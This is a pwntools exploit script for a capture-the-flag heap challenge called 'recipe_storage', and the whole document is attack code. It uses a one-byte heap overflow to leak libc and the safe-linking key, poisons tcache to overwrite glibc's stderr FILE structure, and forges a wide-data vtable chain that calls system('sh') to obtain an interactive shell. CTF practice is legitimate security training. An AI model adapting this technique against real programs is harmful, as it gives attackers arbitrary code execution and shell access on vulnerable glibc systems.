from pwn import *

elf = context.binary = ELF("./recipe_storage_patched")
libc = ELF("./libc.so.6")

p = process()
# gdb.attach(p)
#p = remote("recipe-storage.challs.brunnerne.xyz", 31000)

def malloc(size, idx, content):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'> ', str(size).encode())
    p.sendlineafter(b'> ', str(idx).encode())
    p.sendafter(b'> ', content)

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'> ', str(idx).encode())

def print(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'> ', str(idx).encode())
    return p.recvline().strip()

def edit(idx, content):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'> ', str(idx).encode())
    p.sendafter(b'> ', content)

malloc(0x38, 0, b'A' * 0x38)
malloc(0x38, 1, b'B' * 0x38)
malloc(0x430, 2, p64(0) * 3 + p64(0x21))
malloc(0x10, 3, b'C' * 0x10)

edit(0, b'a' * 0x39)
free(1)
free(2)

malloc(0x50, 4, b'A' * 8*8)
libc.address = u64(print(4)[64:].ljust(8, b'\0')) - libc.sym.main_arena - 96
log.info("libc.address, %#x", libc.address)

edit(4, b'A' * 8*7 + p64(0x441))

malloc(0x100, 5, p64(0) * 3 + p64(0x101))
malloc(0x100, 6, b'a')
free(5)
free(4)

malloc(0x50, 4, b'A' * 8*8)
mangle = u64(print(4)[64:].ljust(8, b'\0'))
log.info("mangle, %#x", mangle)
edit(4, b'A' * 8*7 + p64(0x111))

malloc(0x100, 5, p64(0) * 3 + p64(0x101))
free(6)
free(5)
free(4)

malloc(0x50, 4, b'A' * 8*7 + p64(0x111) + p64(mangle ^ libc.sym._IO_2_1_stderr_))

malloc(0x100, 0, b'A')

stderr_addr = libc.sym._IO_2_1_stderr_

fs = FileStructure()
fs.flags = u64("  " + "sh".ljust(6, "\x00"))
fs._IO_write_base = 0
fs._IO_write_ptr = 1
fs._lock = stderr_addr-0x10 # Should be null
fs.chain = libc.sym.system
fs._codecvt = stderr_addr
fs._wide_data = stderr_addr - 0x48
fs.vtable = libc.sym._IO_wfile_jumps
fsb = bytes(fs)
malloc(0x100, 0, fsb)

p.interactive()

